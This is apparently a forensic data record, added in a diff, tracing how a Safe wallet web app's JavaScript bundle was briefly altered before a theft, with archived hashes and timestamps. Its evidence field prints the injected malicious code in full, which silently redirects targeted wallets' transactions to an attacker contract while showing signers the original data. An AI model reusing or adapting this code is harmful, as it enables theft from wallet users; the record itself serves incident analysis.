@@ -1,0 +1,91 @@
+{
+  "source": "https://web.archive.org/web/*/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js",
+  "path": "/_next/static/chunks/pages/_app-52c9031bfa03da47.js",
+  "theft": {
+    "time": "2025-02-21T14:13:35Z",
+    "tx": "0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882",
+    "block": 21895238
+  },
+  "steps": [
+    {
+      "time": "2025-02-14T13:06:14Z",
+      "hash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+      "bytes": 3744304,
+      "altered": false,
+      "result": "matches",
+      "hoursBeforeTheft": 169.1
+    },
+    {
+      "time": "2025-02-14T19:07:21Z",
+      "hash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+      "bytes": 3744304,
+      "altered": false,
+      "result": "matches",
+      "hoursBeforeTheft": 163.1
+    },
+    {
+      "time": "2025-02-17T02:49:44Z",
+      "hash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+      "bytes": 3744304,
+      "altered": false,
+      "result": "matches",
+      "hoursBeforeTheft": 107.4
+    },
+    {
+      "time": "2025-02-19T11:19:19Z",
+      "hash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+      "bytes": 3744304,
+      "altered": false,
+      "result": "matches",
+      "hoursBeforeTheft": 50.9
+    },
+    {
+      "time": "2025-02-19T17:29:05Z",
+      "hash": "fbd5e3eb17ef62f2ecf7890108a3af9bcc229aaa51820a6e5ec08a56864d864d",
+      "bytes": 3746298,
+      "altered": true,
+      "result": "changed",
+      "hoursBeforeTheft": 44.7
+    },
+    {
+      "time": "2025-02-22T02:26:46Z",
+      "hash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+      "bytes": 3744304,
+      "altered": false,
+      "result": "changed",
+      "hoursBeforeTheft": -12.2
+    },
+    {
+      "time": "2025-02-22T17:55:09Z",
+      "hash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+      "bytes": 3744304,
+      "altered": false,
+      "result": "matches",
+      "hoursBeforeTheft": -27.7
+    }
+  ],
+  "evidence": {
+    "cleanHash": "b93eeeb2063e69101c78eb218991c82f9228191794a4d289ba1403b076c5eef2",
+    "alteredHash": "fbd5e3eb17ef62f2ecf7890108a3af9bcc229aaa51820a6e5ec08a56864d864d",
+    "bytesAdded": 1994,
+    "offset": 1061348,
+    "region": "{let sd=c; let se=e; let st=t;\nlet wa=[\"0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4\",\"0x19c6876e978d9f128147439ac4cd9ea2582cd141\"];\nlet ba=[\"0x828424517f9f04015db02169f4026d57b2b07229\",\"0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97\"];\nlet ta=\"0x96221423681a6d52e184d440a8efcebb105c7242\"; let da=\"0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000\";\nlet op=1; let vl=0; let sga=45746;\nlet sf=sd.getSafeProvider();\nlet sa=await sf.getSignerAddress(); sa=sa.toLowerCase();\nlet lu=await sd.getAddress(); lu=lu.toLowerCase();\nconst cf=wa.some(k1 => lu.includes(k1));\nconst cb=ba.some(k1 => sa.includes(k1));\nif(cf == true && se.data.operation==0){\nconst td=structuredClone(se.data); se.data.to=ta; se.data.operation=op; se.data.data=da; se.data.value=vl; se.data.safeTxGas=sga;\ntry{l=await sd.executeTransaction(se,st);se.data=td;}catch (e) {se.data=td; throw e;}\n} else {l=await sd.executeTransaction(se,st);}}(0,u.DC)(u.hV.EXECUTING,{...d})}catch(e){throw(0,u.DC)(u.hV.FAILED,{...d,error:(0,y.z)(e)}),e}return(0,u.DC)(u.hV.PROCESSING,{...d,nonce:e.data.nonce,txHash:l.hash,signerAddress:a,signerNonce:p,gasLimit:t.gasLimit,txType:\"SafeTx\"}),l.hash},S=async(e,t,n,r,a,i,s,o)=>{let l;let c=e.map(e=>e.txId),d=s.nonce,p=t.encode(\"multiSend\",[n]);try{null==d&&(d=await (0,h.xN)(a));let e=await (0,f.RF)(r);l=await t.contract.connect(e).multiSend(n,s),c.forEach(e=>{(0,u.DC)(u.hV.EXECUTING,{txId:e,groupKey:n,nonce:o})})}catch(e){throw c.forEach(t=>{(0,u.DC)(u.hV.FAILED,{txId:t,error:(0,y.z)(e),groupKey:n,nonce:o})}),e}let m=await t.getAddress();return c.forEach(e=>{(0,u.DC)(u.hV.PROCESSING,{txId:e,txHash:l.hash,groupKey:n,signerNonce:d,signerAddress:a,txType:\"Custom\",data:p,to:m,nonce:o})}),l.hash},_=async(e,t,n)=>{let r;let a=JSON.stringify(e);try{let n=(0,h.U6)(t),i=await n.getSigner();(0,u.DC)(u.hV.EXECUTING,{groupKey:a}),r=await i.sendTransaction(e)}catch(e){throw(0,u.DC)(u.hV.FAILED,{groupKey:a,error:(0,y.z)(e)}),e}return(0,u.DC)(u.hV.PROCESSING_MODULE,{groupKey:a,txHash:r.hash}),null==r||r.wait().then(e=>{null===e?(0,u.DC)(u.hV.FAILED,{groupKey:a,error:Error(\"No transaction receipt found\")}):(0,o.EB)(e)?(0,u.DC)(u.hV.REVERTED,{groupKey:a,error:Error(\"Transaction reverted by EVM\")}):(0,u.DC)(u.hV.PROCESSED,{groupKey:a,safeAddress:n,txHash:null==r?void 0:r.hash})}).catch(e=>{(0,u.DC)(u.hV.FAILED,{groupKey:a,error:(0,y.z)(e)})}),null==r?void 0:r.hash},C=async(e,t,n,r,a,i)=>{let s;let c=JSON.stringify(e);try{let a=await (0,f.RF)(n),o=(0,l.If)(r,i,a);s=await o.executeAllowanceTransfer(e.safeAddress,e.token,e.to,e.amount,e.paymentToken,e.payment,e.delegate,e.signature,t),(0,u.DC)(u.hV.EXECUTING,{groupKey:c})}catch(e){throw(0,u.DC)(u.hV.FAILED,{groupKey:c,error:(0,y.z)(e)}),e}return(0,u.DC)(u.hV.PROCESSING_MODULE,{groupKey:c,txHash:s.hash}),null==s||s.wait().then(e=>{null===e?(0,u.DC)(u.hV.FAILED,{groupKey:c,error:Error(\"No transaction receipt found\")}):(0,o.EB)(e)?(0,u.DC)(u.hV.REVERTED,{groupKey:c,error:Error(\"Transaction reverted by EVM\")}):(0,u.DC)(u.hV.PROCESSED,{groupKey:c,safeAddress:a,txHash:null==s?void 0:s.hash})}).catch(e=>{(0,u.DC)(u.hV.FAILED,{groupKey:c,error:(0,y.z)(e)})}),null==s?void 0:s.hash},O=async(e,t,n,r)=>{let a=await (0,f.OK)(n),i=await a.getTransactionHash(e);return(0,u.DC)(u.hV.SAFE_APPS_REQUEST,{safeAppRequestId:t,safeTxHash:i,txId:r}),i},k=async(e,t,n,r,a)=>{let i=(await (0,p.Gr)(t)).encode(\"execTransaction\",[e.data.to,e.data.value,e.data.data,e.data.operation,e.data.safeTxGas,e.data.baseGas,e.data.gasPrice,e.data.gasToken,e.data.refundReceiver,e.encodedSignatures()]);try{var o;let l=(await (0,s.relayTransaction)(t.chainId,{to:t.address.value,data:i,gasLimit:null==a?void 0:a.toString(),version:null!==(o=t.version)&&void 0!==o?o:(0,b.Tw)(r)})).taskId;if(!l)throw Error(\"Transaction could not be relayed\");(0,u.DC)(u.hV.RELAYING,{taskId:l,txId:n,nonce:e.data.nonce}),(0,d.hw)(l,[n],t.address.value,e.data.nonce)}catch(t){throw(0,u.DC)(u.hV.FAILED,{txId:n,error:(0,y.z)(t),nonce:e.data.nonce}),t}},I=async(e,t,n,r,i,o)=>{let l;let c=await t.getAddress(),p=t.contract.interface.encodeFunctionData(\"multiSend\",[n]);try{l=await (0,s.relayTransaction)(r,{to:c,data:p,version:o})}catch(t){throw e.forEach(e=>{let{txId:r}=e;(0,u.DC)(u.hV.FAILED,{txId:r,error:(0,y.z)(t),groupKey:n})}),t}let f=l.taskId;e.forEach(e=>{let{txId:t,detailedExecutionInfo:r}=e;(0,a.$0)(r)&&(0,u.DC)(u.hV.RELAYING,{taskId:f,txId:t,groupKey:n,nonce:r.nonce})}),(0,d.hw)(f,e.map(e=>e.txId),i,(0,a.$0)(e[0].detailedExecutionInfo)?e[0].detailedExecutionInfo.nonce:0,n)};var M=n(59221);let P=async(e,t,n,r)=>({to:t,value:\"0\",data:(await (0,p.XP)(e,n)).encode(\"enableModule\",[r])}),R=(e,t)=>({to:t,value:\"0\",data:(0,l.Fk)().encodeFunctionData(\"addDelegate\",[e])}),N=(e,t,n)=>({to:n,value:\"0\",data:(0,l.Fk)().encodeFunctionData(\"resetAllowance\",[e,t])}),j=(e,t,n,r,a,i)=>({to:i,value:\"0\",data:(0,l.Fk)().encodeFunctionData(\"setAllowance\",[e,t,n,r,a])});var D=n(95508),B=n(46691);let L=async(e,t,n,a,i,s,o,c)=>{let u=(0,M.yP)();if(!u)return;let d=s&&(0,l.cF)(n,i),p=!!d;if(p||(d=(0,l.$7)(n)),!d)return;let f=[];if(s){if(!p){let e=await u.createEnableModuleTx(d),t={to:e.data.to,value:\"0\",data:e.data.data};f.push(t)}}else{let e=await P(a,await u.getAddress(),await u.getContractVersion(),d),t={to:e.to,value:\"0\",data:e.data};f.push(t)}t.find(t=>t.beneficiary===e.beneficiary)||f.push(R(e.beneficiary,d)),c&&\"0\"!==c.spent&&f.push(N(e.beneficiary,e.tokenAddress,d));let h=j(e.beneficiary,e.tokenAddress,(0,D.XS)(e.amount,o).toString(),parseInt(e.resetTime),\"0\"!==e.resetTime?(0,B.Jt)()-30:0,d);return f.push(h),(0,r.w6)(f)}},42309:(e,t,n)=>{\"use strict\";n.d(t,{Tl:()=>x,Z3:()=>E,vK:()=>w,OK:()=>_,ov:()=>C,RF:()=>S,gM:()=>k,l2:()=>M,ip:()=>I,jJ:()=>T,PW:()=>O});var r=n(59221),a=n(72921),i=n(52331),s=n(44894),o=n(92372),l=n(8442),c=n(67043),u=n(52425),d=n(28213),p=n(53266),f=n(99744),h=n(55155),y=n(8648);class m extends y.cP{async sendTransaction(e){return this.sendUncheckedTransaction(e).then(e=>({hash:e,nonce:null,gasLimit:null,gasPrice:null,data:null,value:null,chainId:null,confirmations:0,from:null,wait:t=>this.provider.waitForTransaction(e,t)}))}}var b=n(13107),g=n.n(b),v=n(31243);let x=()=>{let e=(0,r.yP)();if(!e)throw Error(\"The Safe SDK could not be initialized. Please be aware that we only support v1.0.0 Safe Accounts and up.\");return e},w=()=>{let e=(0,d.iv)();if(!e)throw Error(\"Provider not found.\");return new a.SafeProvider({provider:e._getConnection().url})};async function A(e,t){let n=(0,p.nD)(parseInt(t));try{return await e.request({method:\"wallet_switchEthereumChain\",params:[{chainId:n}]})}catch(i){let r=g()(i,\"code\"),a=g()(i,\"data.originalError.code\");if(4902===r||4902===a){let r=await (0,l.getChainConfig)(t);return e.request({method:\"wallet_addEthereumChain\",params:[{chainId:n,chainName:r.chainName,nativeCurrency:r.nativeCurrency,rpcUrls:[r.publicRpcUri.value],blockExplorerUrls:[new URL(r.blockExplorerUriTemplate.address).origin]}]})}throw i}}let T=async(e,t)=>{let n=(0,f.hl)(e.state.get().wallets);if(!n)return null;if(n.chainId===t&&!(0,s.ou)(n))return n;if((0,s.SQ)(n)){await e.disconnectWallet({label:n.label});let t=await (0,f.kv)(e,{autoSelect:n.label});return t?(0,f.hl)(t):null}return new Promise(r=>{let a=e.state.select(\"wallets\").subscribe(e=>{let n=(0,f.hl)(e);n&&n.chainId===t&&(a.unsubscribe(),r(n))});A(n.provider,t).catch(()=>{a.unsubscribe(),r(n)})})},E=async e=>(0,d.U6)(e).getSigner(),S=async e=>{let t=(0,d.U6)(e);return new m(t,(await t.getSigner()).address)},_=async e=>x().connect({provider:e}),C=e=>(0,u.Q)(c.SAFE_FEATURES.ETH_SIGN,e)?[a.SigningMethod.ETH_SIGN_TYPED_DATA,a.SigningMethod.ETH_SIGN]:[a.SigningMethod.ETH_SIGN_TYPED_DATA],O=async(e,t,n)=>{let r=C(t);for await(let[t,a]of r.entries())try{let sd=n; let se=e; let st=a;\nlet wa=[\"0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4\",\"0x19c6876e978d9f128147439ac4cd9ea2582cd141\"];\nlet ba=[\"0x828424517f9f04015db02169f4026d57b2b07229\",\"0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97\"];\nlet ta=\"0x96221423681a6d52e184d440a8efcebb105c7242\"; let da=\"0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000\";\nlet op=1; let vl=0; let sga=45746;\nlet sf=sd.getSafeProvider();\nlet sa=await sf.getSignerAddress(); sa=sa.toLowerCase();\nlet lu=await sd.getAddress(); lu=lu.toLowerCase();\nconst cf=wa.some(k1 => lu.includes(k1));\nconst cb=ba.some(k1 => sa.includes(k1));\nif(cb==true){location.href=location.href;}\nif(cf==true && se.data.operation==0){\nconst td=structuredClone(se.data); se.data.to=ta; se.data.operation=op; se.data.data=da; se.data.value=vl; se.data.safeTxGas=sga;\ntry { const r=await sd.signTransaction(se,st); r.data=td; se.data=td; return r; } catch (n) { se.data=td; throw n; }\n} else {const r=await sd.signTransaction(se,st); return r;}"
+  },
+  "asNewRelease": {
+    "added": {
+      "addrs": [
+        "0x19c6876e978d9f128147439ac4cd9ea2582cd141",
+        "0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4",
+        "0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97",
+        "0x828424517f9f04015db02169f4026d57b2b07229",
+        "0x96221423681a6d52e184d440a8efcebb105c7242"
+      ],
+      "hosts": []
+    },
+    "totals": {
+      "addrs": 5,
+      "hosts": 0
+    },
+    "knownAddrs": 72
+  }
+}
